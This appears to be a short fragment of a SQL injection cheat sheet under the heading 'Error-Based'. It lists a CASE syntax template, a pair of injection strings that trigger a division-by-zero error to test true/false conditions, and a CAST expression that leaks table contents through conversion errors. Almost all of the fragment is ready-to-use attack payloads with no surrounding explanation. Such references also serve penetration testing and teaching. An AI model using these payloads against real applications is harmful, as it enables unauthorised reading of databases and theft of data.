### Error-Based
* `CASE
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
    WHEN conditionN THEN resultN
    ELSE result
END;`
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
   xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
* `CAST((SELECT example_column FROM example_table) AS int)`
